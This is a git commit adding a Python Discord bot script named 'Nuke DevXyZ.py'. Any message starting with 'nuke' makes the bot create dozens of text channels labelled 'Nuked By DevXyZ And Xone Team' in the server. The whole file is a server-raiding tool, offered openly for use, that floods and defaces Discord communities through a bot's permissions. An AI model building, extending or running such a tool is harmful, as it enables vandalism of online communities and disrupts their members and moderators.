50d48d4b827ce870f761d7a27ac920f4e3e27636
DevXyZ <92054533+DevXyZ0009@users.noreply.github.com>
2021-10-15 11:15:13 +0700

    Add files via upload

---
+++ Nuke DevXyZ.py
@@ -0,0 +1,50 @@
+import os
+import discord
+
+client = discord.Client()
+
+@client.event
+async def on_ready():
+  print('Dah Siap Bos DevXyZ?')
+  
+@client.event
+async def on_message(message):
+  if (message.content.startswith('nuke')):
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Get Hack By DevXyZ And  Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    await message.guild.create_text_channel('Nuked By DevXyZ And Xone Team')
+    
+
+
+  
+client.run(os.getenv('TOKEN'))
